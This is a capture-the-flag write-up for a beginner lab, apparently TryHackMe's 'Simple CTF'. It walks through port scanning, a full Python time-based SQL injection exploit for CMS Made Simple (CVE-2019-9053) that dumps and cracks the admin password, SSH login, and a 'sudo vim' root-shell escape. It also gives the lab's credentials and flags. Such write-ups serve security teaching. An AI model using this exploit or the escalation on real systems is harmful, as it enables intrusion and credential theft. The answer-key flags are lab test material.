# Simple CTF

## **Description**

Beginner level CTF

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

## Answer the questions below

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

### How many services are running under port 1000?

#### Nmap

```bash
nmap -A -Pn 10.10.252.182
```

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

```
ANS: 2
```

### What is running on the higher port?

```
ANS: ssh
```

### What's the CVE you're using against the application?

#### Directory Enumeration

```bash
dirsearch -u http://10.10.252.182 
```

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

After explore the website, I found that **CMS Made Simple version 2.2.8** that make me find the vulnerability. Bingo! I found it [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635)

```
ANS: CVE-2019-9053
```

### To what kind of vulnerability is the application vulnerable?

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

```
ANS: sqli
```

### What's the password?

#### Exploitation

```python
#Update Code to python3 Thanks for someone who fix this I forget where I got it.
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt  
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password"))
    crack_password()

beautify_print()
```

```bash
python3 exploit.py -u http://10.10.252.182/simple/ -w /usr/share/wordlists/rockyou.txt -c
```

<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption><p>mitch : secret</p></figcaption></figure>

```
ANS: secret
```

### Where can you login with the details obtained?

#### Connect with SSH

```bash
ssh mitch@10.10.252.182 -p 2222
```

<figure><img src="../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

```
ANS: ssh
```

### What's the user flag?

<figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

```
ANS: G00d j0b, keep up!
```

### Is there any other user in the home directory? What's its name?

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

```
ANS: sunbath
```

### What can you leverage to spawn a privileged shell?

#### Check sudo -l

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

```
ANS: vim
```

### What's the root flag?

#### Check GTFOBINS

<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p></figcaption></figure>

```bash
sudo vim -c ':!/bin/sh'
```

<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption><p>W3ll d0n3. You made it!</p></figcaption></figure>

```
ANS: W3ll d0n3. You made it!
```

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
